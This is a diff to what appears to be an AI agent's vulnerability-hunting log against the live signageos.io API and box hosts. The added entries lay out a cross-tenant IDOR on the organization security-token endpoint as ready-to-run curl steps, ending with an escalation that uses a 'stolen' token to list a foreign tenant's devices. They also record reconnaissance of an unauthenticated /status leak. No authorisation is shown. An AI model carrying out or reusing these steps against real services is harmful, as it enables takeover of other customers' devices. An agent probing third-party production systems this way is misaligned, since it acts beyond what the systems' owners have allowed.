@@ -3076,3 +3076,24 @@ testability: PASSIVE
 [NEXT] HUMAN: `sos login` to obtain a valid account JWT `<accountJWT>`, then execute AUTH_HELPED verify_steps for the cross-tenant security-token mint: 1) baseline own-org token mint (confirm 200 + securityToken returned); 2) POST same X-Auth to /v1/organization/<foreign-org-uid>/security-token — a 200 response (vs 403) would confirm the CRITICAL cross-tenant IDOR. This is the only remaining CRITICAL-class finding; requires valid signed credentials to progress from confidence 82 to confirmed.
 [RISK] box.signageos.io: 68 — Unauthenticated /status infra-leak (pod hostname + process UID + Node v20.20.2 + full topology + per-service responseTime) with zero hardening headers (grep=0) confirmed across 30+ cycles behind CloudFront; 17-origin static CORS ACAO whitelist incl `http://` plaintext + `*.zdusercontent.com` wildcard (0 credentials flag → MISCONFIG only); CSP hardened on /+/login/ (differential vs /status); no other unauthenticated authn surface (login catch-all, /ready trivial). POC complete.
 [RISK] api.signageos.io: 80 — /status info-leak persists despite header hardening (HSTS/xfo/xcto/no-store behind CF, zero ACAO — not CORS-exploitable); 60+ /v1/*+v2/* endpoints solidly JWT/X-Auth-gated (403 without token, zero ACAO); dual-auth surface (JWT Bearer + X-Auth `id:unsafeDecryptedToken`) fully exposed; code-verified cross-tenant IDOR on security-token mint (AUTH_HELPED, conf 82) with CRITICAL business impact; /v2 migration advancing (/v2/device → 403 not 404); descriptive-error leak (excluded) enumerates auth boundary; residual CRITICAL risk = unverified cross-tenant token mint.
+## 2026-08-13 20:07:02 UTC [box] (model laguna)
+[HYP] Cross-tenant security-token mint via X-Auth org-UID path override on /v1/organization/{uid}/security-token
+class: IDOR
+asset: api.signageos.io/v1/organization/{uid}/security-token
+confidence: 82
+reasoning: SDK/CLI code-verified POST with X-Auth returns org-scoped securityToken; {uid} is client-supplied path arg; account JWT has no org UID, server-side org-membership check on path {uid} is sole barrier. 2026-08-13 probe returns 403074 MISSING_ACCOUNT_ID_TO_AUTHENTICATE (was 403105), confirming X-Auth/x-oauth-client_id gating and reaching org-resolution branch.
+evidence_needed: Own org account JWT → HTTP 200 on POST /v1/organization/<own-org-uid>/security-token returning securityToken; then foreign org UID → HTTP 200 (not 403) returning foreign-token
+verify_steps: AUTH_HELPED: 1) `sos login` → account JWT `<accountJWT>`; 2) `curl -sS -X POST -H "X-Auth: <accountJWT>" https://api.signageos.io/v1/organization/<own-org-uid>/security-token` → expect 200 + securityToken in body; 3) `curl -sS -X POST -H "X-Auth: <accountJWT>" https://api.signageos.io/v1/organization/<foreign-org-uid>/security-token` → expect 200 (not 403) + foreign securityToken; 4) escalate: `curl -sS -H "Authorization: Bearer <stolen_securityToken>" https://api.signageos.io/v1/device` → foreign org device list
+impact: Any authenticated tenant can mint organization security-tokens for any foreign tenant → full cross-tenant device/content/timing/firmware control. CRITICAL
+testability: AUTH_HELPED
+[HYP] box /status unauthenticated infra-leak with zero response hardening
+class: MISCONFIG
+asset: box.signageos.io/status
+confidence: 96
+reasoning: Fresh probe (pod box-8676fb5f57-dnqvp, uid c5d77454…) confirms unauthenticated HTTP 200 JSON leaks pod hostname, 40-hex process UID, Node v20.20.2, 9-service topology + per-service responseTime. Headers ONLY x-powered-by: Express + CloudFront; security-header grep=0.
+evidence_needed: curl -sS https://box.signageos.io/status → 200 JSON with hostname/uid/services; grep -ciE 'strict-transport|x-frame|x-content|content-security' headers → 0
+verify_steps: PASSIVE: curl -sS -o /tmp/box_body.json -D /tmp/box_headers.txt https://box.signageos.io/status → HTTP 200 application/json; grep -ciE 'strict-transport|x-frame|x-content|content-security' /tmp/box_headers.txt → 0; jq '.hostname,.process.uid,.succeededServices' /tmp/box_body.json → expect fields present
+impact: Unauthenticated disclosure of K8s pod identity, process UID, Node version, internal service topology — infrastructure reconnaissance enabling chained attacks. MODERATE
+testability: PASSIVE
+[FINAL]
+[NEXT] HUMAN: `sos login` to obtain a valid account JWT `<accountJWT>`, then execute AUTH_HELPED verify_steps for the cross-tenant security-token mint: 1) baseline own-org token mint (confirm 200 + securityToken returned); 2) POST same X-Auth to /v1/organization/<foreign-org-uid>/security-token — a 200 response (vs 403) would confirm the CRITICAL cross-tenant IDOR. This is the only remaining CRITICAL-class finding; requires valid signed credentials to progress from confidence 82 to confirmed.
